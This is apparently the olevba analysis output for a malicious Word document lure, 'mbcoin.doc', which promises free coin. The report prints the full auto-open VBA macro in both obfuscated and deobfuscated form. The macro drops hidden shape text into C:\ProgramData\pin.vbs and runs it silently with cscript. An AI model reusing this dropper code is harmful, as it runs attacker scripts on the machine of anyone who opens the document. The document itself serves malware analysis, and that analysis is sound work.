'olevba 0.60 on Python 2.7.18 - http://decalage.info/python/oletools
'===============================================================================
'FILE: sources/mbcoin.doc
'Type: OLE

'+----------+--------------------+---------------------------------------------+
'|Type      |Keyword             |Description                                  |
'+----------+--------------------+---------------------------------------------+
'|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
'|Suspicious|Shell               |May run an executable file or a system       |
'|          |                    |command                                      |
'|Suspicious|Open                |May open a file                              |
'|Suspicious|Output              |May write to a file (if combined with Open)  |
'|Suspicious|Print #             |May write to a file (if combined with Open)  |
'|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
'|          |                    |(use option --deobf to deobfuscate)          |
'|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
'|          |                    |(use option --deobf to deobfuscate)          |
'|Suspicious|VBA obfuscated      |VBA string expressions were detected, may be |
'|          |Strings             |used to obfuscate strings (option --decode to|
'|          |                    |see all)                                     |
'|IOC       |pin.vbs             |Executable file name (obfuscation: VBA       |
'|          |                    |expression)                                  |
'|IOC       |cscript.exe         |Executable file name (obfuscation: VBA       |
'|          |                    |expression)                                  |
'|VBA string|C:\ProgramData\     |StrReverse("\ataDmargorP\:C")                |
'|VBA string|pin.vbs             |StrReverse("sbv.nip")                        |
'|VBA string|                    |StrReverse("")                               |
'|VBA string|IZIMIZIOZI          |StrReverse("IZOIZIMIZI")                     |
'|VBA string|cmd /k cscript.exe C|StrReverse("sbv.nip\ataDmargorP\:C           |
'|          |:\ProgramData\pin.vb|exe.tpircsc k/ dmc")                         |
'|          |s                   |                                             |
'|VBA string|0                   |Chr(48)                                      |
'+----------+--------------------+---------------------------------------------+

'-------------------------------------------------------------------------------
'VBA MACRO ThisDocument.cls 
'in file: sources/mbcoin.doc - OLE stream: u'Macros/VBA/ThisDocument'
'- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'(empty macro)

'-------------------------------------------------------------------------------
'VBA MACRO bxh.bas 
'in file: sources/mbcoin.doc - OLE stream: u'Macros/VBA/bxh'
'- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    Dim QQ1 As Object
    Set QQ1 = ActiveDocument.Shapes(1)
    Dim QQ2 As Object
    Set QQ2 = ActiveDocument.Shapes(2)
    RO = StrReverse("\ataDmargorP\:C")
    ROI = RO + StrReverse("sbv.nip")
    ii = StrReverse("")
    Ne = StrReverse("IZOIZIMIZI")
    WW = QQ1.AlternativeText + QQ2.AlternativeText
    MyFile = FreeFile
    Open ROI For Output As #MyFile
    Print #MyFile, WW
    Close #MyFile
    fun = Shell(StrReverse("sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc"), Chr(48))
    
    waitTill = Now() + TimeValue("00:00:05")
    While Now() < waitTill
    Wend
    MsgBox ("Unfortunately you are not eligable for free coin!")
    End
    
End Sub
'- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'MACRO SOURCE CODE WITH DEOBFUSCATED VBA STRINGS (EXPERIMENTAL)
Attribute VB_Name = "bxh"
Sub AutoOpen()
    Dim QQ1 As Object
    Set QQ1 = ActiveDocument.Shapes(1)
    Dim QQ2 As Object
    Set QQ2 = ActiveDocument.Shapes(2)
    RO = "C:\ProgramData\"
    ROI = RO + "pin.vbs"
    ii = ""
    Ne = "IZIMIZIOZI"
    WW = QQ1.AlternativeText + QQ2.AlternativeText
    MyFile = FreeFile
    Open ROI For Output As #MyFile
    Print #MyFile, WW
    Close #MyFile
    fun = Shell("cmd /k cscript.exe C:\ProgramData\pin.vbs", "0")
    
    waitTill = Now() + TimeValue("00:00:05")
    While Now() < waitTill
    Wend
    MsgBox ("Unfortunately you are not eligable for free coin!")
    End
    
End Sub
